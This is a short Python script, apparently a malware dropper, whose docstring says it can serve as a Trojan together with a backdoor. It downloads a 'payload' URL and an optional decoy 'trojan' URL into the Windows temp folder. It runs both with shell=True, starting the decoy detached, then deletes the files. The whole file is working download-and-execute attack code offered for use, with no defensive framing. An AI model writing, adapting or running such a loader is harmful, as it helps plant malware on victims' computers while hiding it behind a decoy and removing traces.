"""
Downloads up to two files and executes them.
Can be used as a Trojan in combination with
a backdoor or other similar program.
Tested and run on Windows 10.
"""


import argparse
import os
import subprocess
import tempfile
import utils


def main():
    args = init_argparse()
    payload = args.payload
    trojan = args.trojan

    path = tempfile.gettempdir()
    os.chdir(path)

    trojan_fname = download_execute(trojan, True)
    payload_fname = download_execute(payload, False)

    if trojan_fname:
        os.remove(trojan_fname)
    if payload_fname:
        os.remove(payload_fname)



def download_execute(url, is_trojan):
    if url:
        last_slash = url.rindex("/") + 1
        fname = url[last_slash:]
        utils.download(url, fname)

        if is_trojan:
            subprocess.Popen(fname, shell=True)
        else:
            subprocess.run(fname, shell=True)

        return fname

def init_argparse():
    parser = argparse.ArgumentParser(description="Download a file and execute it.")
    parser.add_argument("--payload", "-p", type=str, required=True, help="The url of the payload to download and run.")
    parser.add_argument("--trojan", "-t", type=str, help="The url of the trojan to download and open.")
    return parser.parse_args()


if __name__ == "__main__":
    main()